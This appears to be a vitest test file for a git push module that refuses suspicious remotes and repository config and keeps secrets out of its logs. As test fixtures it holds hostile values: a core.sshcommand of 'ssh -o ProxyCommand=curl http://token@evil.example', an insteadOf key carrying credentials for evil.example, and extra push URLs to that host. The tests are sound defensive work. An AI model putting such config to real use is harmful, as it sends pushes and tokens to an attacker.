import { describe, expect, it } from "vitest";
import { captureLogger } from "../../testing/capture-logger.ts";
import { ORIGIN_URLS_ARGS, PUSH_SCAN_ARGS } from "./exec.ts";
import { classifyPush, pushLane, readPushTarget } from "./push-lane.ts";
import { GitError, type GitRunner, type GitRunOptions } from "./runner.ts";

const ROOT = "/wt/lane-1";
const GIT_DIR = "/repo/.git/worktrees/lane-1";
const LANE = { root: ROOT, gitDir: GIT_DIR, branch: "pi/x" };
const GH = "https://github.com/o/r.git";
const buf = (text: string) => Buffer.from(text);
const GET_URL = ["remote", "get-url", "--push", "--all", "origin"];
const PUSH = ["push", "--porcelain", "--set-upstream", "origin", "refs/heads/pi/x:refs/heads/pi/x"];

interface Script {
  origin?: string;
  push?: string;
  /** Raw scan output: `scope NUL key LF value NUL` repeated. */
  scan?: string;
  pushRun?: { code: number; stdout?: string; stderr?: string } | GitError;
  getUrlCode?: number;
}

function fake(script: Script) {
  const calls: Array<{ root: string; args: string[]; options: GitRunOptions }> = [];
  const git: GitRunner = {
    async run(root, args, options = {}) {
      calls.push({ root, args: [...args], options });
      if (args[0] === "push") {
        const run = script.pushRun ?? { code: 0 };
        if (run instanceof GitError) throw run;
        return { stdout: buf(run.stdout ?? ""), code: run.code, stderr: run.stderr ?? "" };
      }
      if (args[0] === "remote")
        return {
          stdout: buf(script.getUrlCode === 2 ? "" : (script.push ?? `${GH}\n`)),
          code: script.getUrlCode ?? 0,
        };
      if (args.join("\0") === [...ORIGIN_URLS_ARGS].join("\0"))
        return { stdout: buf(script.origin ?? `${GH}\n`), code: 0 };
      if (args.join("\0") === [...PUSH_SCAN_ARGS].join("\0"))
        return { stdout: buf(script.scan ?? ""), code: 0 };
      throw new Error(`unexpected ${args.join(" ")}`);
    },
  };
  return { git, calls };
}
const pushed = (calls: Array<{ args: string[] }>) => calls.some((call) => call.args[0] === "push");
const scanOf = (scope: string, key: string, value: string) => `${scope}\0${key}\n${value}\0`;

describe("readPushTarget and pushLane", () => {
  it("runs the scan, both reads and the push from the lane root with the stored git dir", async () => {
    const { git, calls } = fake({});
    const { logger } = captureLogger();
    const result = await pushLane({ git, logger, allowFile: false }, LANE);
    expect(result).toEqual({ ok: true, target: { host: "github.com", path: "o/r" } });
    expect(calls.map((call) => call.args)).toEqual([
      [...PUSH_SCAN_ARGS],
      [...ORIGIN_URLS_ARGS],
      GET_URL,
      PUSH,
    ]);
    for (const call of calls) {
      expect(call.root).toBe(ROOT);
      expect(call.options.gitDir).toBe(GIT_DIR);
    }
    expect(calls[3]?.options).toMatchObject({
      profile: "remote",
      timeoutMs: 120_000,
      okCodes: [0, 1, 128],
      keepStderr: true,
    });
    for (const call of calls.slice(0, 3)) expect(call.options.profile ?? "local").toBe("local");
  });

  it("answers no_remote when origin has no URL", async () => {
    const { git } = fake({ origin: "", getUrlCode: 2 });
    const { logger } = captureLogger();
    expect(await readPushTarget({ git, logger, allowFile: false }, LANE)).toMatchObject({
      target: { ok: false, reason: "no_remote" },
    });
  });

  it("refuses a file remote in production and accepts it only under the test seam", async () => {
    const file = "file:///srv/remote.git";
    const { logger } = captureLogger();
    const production = fake({ origin: `${file}\n`, push: `${file}\n` });
    expect(await pushLane({ git: production.git, logger, allowFile: false }, LANE)).toEqual({
      ok: false,
      reason: "unsupported_remote",
    });
    expect(pushed(production.calls)).toBe(false);
    const seam = fake({ origin: `${file}\n`, push: `${file}\n` });
    expect(await pushLane({ git: seam.git, logger, allowFile: true }, LANE)).toEqual({
      ok: true,
      target: { host: "local", path: "remote.git" },
    });
  });

  it("refuses a pushurl of another repository, two push URLs and two origin URLs, and never pushes", async () => {
    const { logger } = captureLogger();
    for (const script of [
      { push: "https://github.com/o/other.git\n" },
      { push: `${GH}\nhttps://evil.example/o/r.git\n` },
      { origin: `${GH}\nhttps://evil.example/o/r.git\n` },
    ]) {
      const { git, calls } = fake(script);
      expect(await pushLane({ git, logger, allowFile: false }, LANE)).toEqual({
        ok: false,
        reason: "repo_config",
      });
      expect(pushed(calls)).toBe(false);
    }
  });

  it("refuses a repository-scoped key before it looks at the URLs, and the log names the key, not the value", async () => {
    const secret = "ssh -o ProxyCommand=curl http://token@evil.example";
    // No remote at all: the scan still decides first.
    const { git, calls } = fake({
      origin: "",
      getUrlCode: 2,
      scan: scanOf("local", "core.sshcommand", secret) + scanOf("global", "http.proxy", "http://owner"),
    });
    const { logger, lines } = captureLogger();
    expect(await pushLane({ git, logger, allowFile: false }, LANE)).toEqual({
      ok: false,
      reason: "repo_config",
    });
    expect(pushed(calls)).toBe(false);
    const line = lines.find((entry) => entry.msg === "push_refused");
    expect(JSON.stringify(line)).toContain("core.sshcommand");
    expect(JSON.stringify(lines)).not.toContain("ProxyCommand");
    expect(JSON.stringify(lines)).not.toContain("token@evil");
    expect(JSON.stringify(lines)).not.toContain("http.proxy");
  });

  it("logs a url insteadOf key without the URL inside it", async () => {
    const { git } = fake({
      scan: scanOf("local", "url.https://user:secret@evil.example/.insteadof", "https://github.com/"),
    });
    const { logger, lines } = captureLogger();
    await pushLane({ git, logger, allowFile: false }, LANE);
    expect(JSON.stringify(lines)).toContain("url.insteadof");
    expect(JSON.stringify(lines)).not.toContain("secret");
  });

  it("classifies a failed push", async () => {
    const { logger } = captureLogger();
    const cases: Array<[{ code: number; stdout?: string; stderr?: string }, string]> = [
      [
        { code: 1, stdout: "To x\n!\trefs/heads/pi/x:refs/heads/pi/x\t[rejected] (fetch first)\n" },
        "rejected",
      ],
      [{ code: 1, stderr: " ! [rejected]        pi/x -> pi/x (non-fast-forward)" }, "rejected"],
      [{ code: 1, stderr: "hint: fetch first" }, "rejected"],
      [{ code: 128, stderr: "fatal: Authentication failed for 'https://x'" }, "auth"],
      [{ code: 128, stderr: "git@github.com: Permission denied (publickey)." }, "auth"],
      [
        { code: 128, stderr: "fatal: could not read Username for 'https://x': terminal prompts disabled" },
        "auth",
      ],
      [
        { code: 128, stderr: "fatal: unable to access 'https://x/': The requested URL returned error: 403" },
        "auth",
      ],
      [{ code: 128, stderr: "fatal: unable to access 'https://x/': Could not resolve host: x" }, "network"],
      [
        { code: 128, stderr: "fatal: unable to access 'https://x/': Could not resolve host: x403.example" },
        "network",
      ],
      [{ code: 128, stderr: "ssh: connect to host x port 22: Connection refused" }, "network"],
      [{ code: 128, stderr: "ssh: connect to host x port 22: Network is unreachable" }, "network"],
      [{ code: 128, stderr: "Connection timed out" }, "network"],
      [{ code: 128, stderr: "fatal: something else" }, "failed"],
    ];
    for (const [run, reason] of cases) {
      const { git } = fake({ pushRun: run });
      expect(await pushLane({ git, logger, allowFile: false }, LANE), JSON.stringify(run)).toEqual({
        ok: false,
        reason,
      });
    }
    expect(classifyPush({ code: 0, stdout: "", stderr: "" })).toBeNull();
  });

  it("lets a push timeout through (the outcome is unknown) and maps any other git failure to failed", async () => {
    const { logger } = captureLogger();
    const late = fake({ pushRun: new GitError("timeout") });
    await expect(pushLane({ git: late.git, logger, allowFile: false }, LANE)).rejects.toMatchObject({
      kind: "timeout",
    });
    const broken = fake({ pushRun: new GitError("failed") });
    expect(await pushLane({ git: broken.git, logger, allowFile: false }, LANE)).toEqual({
      ok: false,
      reason: "failed",
    });
  });

  it("reads the configured origin as the forge identity, apart from where the push goes", async () => {
    const { logger } = captureLogger();
    const ssh = fake({ origin: `${GH}\n`, push: "git@github.com:o/r.git\n" });
    const read = await readPushTarget({ git: ssh.git, logger, allowFile: false }, LANE);
    expect(read.origin).toEqual({ host: "github.com", path: "o/r" });
    expect(read.target).toEqual({ ok: true, target: { host: "github.com", path: "o/r" } });
    // The owner's global insteadOf made the push URL a local path (the test seam): the identity is still the forge's.
    const local = fake({ origin: `${GH}\n`, push: "file:///srv/remote.git\n" });
    const seam = await readPushTarget({ git: local.git, logger, allowFile: true }, LANE);
    expect(seam.origin).toEqual({ host: "github.com", path: "o/r" });
    expect(seam.target).toEqual({ ok: true, target: { host: "local", path: "remote.git" } });
  });

  it("works from a main checkout without a git dir (the preview)", async () => {
    const { git, calls } = fake({});
    const { logger } = captureLogger();
    await readPushTarget({ git, logger, allowFile: false }, { root: "/repo" });
    for (const call of calls) expect(call.options.gitDir).toBeUndefined();
  });
});
